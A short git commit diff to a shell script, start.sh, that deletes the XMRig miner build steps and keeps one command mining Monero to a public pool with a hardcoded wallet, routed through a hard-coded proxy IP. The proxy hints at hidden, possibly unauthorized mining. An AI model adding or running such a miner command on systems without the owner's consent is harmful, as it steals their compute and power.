efffb681f064749ad5d411ccf55d6d7a9ca4aaaf
Dadora-Lee <dadorasoft@gmail.com>
2025-05-12 14:37:40 +0900

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,5 +1,1 @@
-mkdir xmrig/build && cd xmrig/build
-cmake ..
-make -j$(nproc)
-sudo sysctl -w vm.nr_hugepages=1280
 ./xmrig -o pool.supportxmr.com:3333 -u 42Z6ArQrn7iLBXj93QDsLY7Ho1xM4dXavSz1j8n8YuawUTvXCxaVgUmBpqtHkaFzM4TGBRT6s6kpEdezjwoMhbjJHFe19BU -p XMR_791_AHS -k --proxy=98.175.31.195:4145
